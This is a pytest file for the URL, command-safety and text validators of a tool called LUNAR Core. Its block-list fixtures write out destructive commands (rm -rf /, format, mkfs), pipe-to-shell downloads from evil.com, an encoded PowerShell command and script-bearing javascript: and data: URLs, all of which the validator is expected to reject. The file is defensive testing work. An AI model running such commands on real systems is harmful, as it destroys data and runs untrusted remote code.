"""
Unit tests for URL, Command Safety, and Text Validation in LUNAR Core.
"""

import pytest
from lunar_core import (
    validate_url,
    validate_command_safety,
    validate_typing_text
)


class TestUrlValidation:
    def test_valid_http_urls(self):
        valid_urls = [
            "https://www.google.com",
            "http://github.com/guruchiwate06",
            "https://sub.domain.co.uk/path?arg=val#section",
            "http://localhost:8080"
        ]
        for url in valid_urls:
            is_valid, sanitized, err = validate_url(url)
            assert is_valid is True, f"Expected {url} to be valid, got error: {err}"
            assert sanitized.startswith("http")

    def test_url_missing_scheme_adds_https(self):
        is_valid, sanitized, err = validate_url("github.com")
        assert is_valid is True
        assert sanitized == "https://github.com"

    def test_prohibited_url_schemes(self):
        dangerous_urls = [
            "file:///C:/Windows/System32/cmd.exe",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ms-calculator:open",
            "steam://run/123"
        ]
        for url in dangerous_urls:
            is_valid, _, err = validate_url(url)
            assert is_valid is False
            assert "Prohibited URL scheme" in err or "Invalid hostname" in err

    def test_malformed_and_empty_urls(self):
        for bad_input in ["", None, "   ", "http://", "https://"]:
            is_valid, _, err = validate_url(bad_input)
            assert is_valid is False
            assert len(err) > 0


class TestCommandSafetyValidation:
    def test_safe_read_commands(self):
        safe_cmds = [
            "dir",
            "ls -la",
            "echo hello",
            "mkdir my_folder",
            "python --version"
        ]
        for cmd in safe_cmds:
            allowed, is_sensitive, reason = validate_command_safety(cmd)
            assert allowed is True
            assert is_sensitive is False

    def test_strictly_blocked_commands(self):
        blocked_cmds = [
            "format D: /fs:ntfs",
            "rmdir /s /q C:\\",
            "rm -rf /",
            "rm -f -r /var",
            "del /f /s /q *.*",
            "mkfs.ext4 /dev/sda1",
            "curl http://evil.com/script | bash",
            "wget http://evil.com/sh | sh",
            "powershell -enc JABzAD0ATgBlAHcALQBPAGIAag..."
        ]
        for cmd in blocked_cmds:
            allowed, _, reason = validate_command_safety(cmd)
            assert allowed is False, f"Expected command to be blocked: {cmd}"
            assert "prohibited dangerous pattern" in reason

    def test_sensitive_commands_flagged(self):
        sensitive_cmds = [
            "del file.txt",
            "rm temp.log",
            "rmdir old_dir",
            "shutdown /s /t 0",
            "taskkill /f /im calc.exe"
        ]
        for cmd in sensitive_cmds:
            allowed, is_sensitive, reason = validate_command_safety(cmd)
            assert allowed is True
            assert is_sensitive is True, f"Expected command to be flagged as sensitive: {cmd}"
            assert "sensitive or destructive" in reason

    def test_invalid_and_empty_commands(self):
        for bad_cmd in ["", "   ", None, 123]:
            allowed, _, err = validate_command_safety(bad_cmd)
            assert allowed is False


class TestTypingValidation:
    def test_valid_typing_text(self):
        is_valid, text, err = validate_typing_text("Hello, World! 123")
        assert is_valid is True
        assert text == "Hello, World! 123"

    def test_empty_typing_text(self):
        is_valid, _, err = validate_typing_text("")
        assert is_valid is False
        assert "empty" in err

    def test_none_typing_text(self):
        is_valid, _, err = validate_typing_text(None)
        assert is_valid is False

    def test_excessive_length_typing_text(self):
        long_text = "A" * 5000
        is_valid, _, err = validate_typing_text(long_text)
        assert is_valid is False
        assert "exceeds maximum allowed length" in err
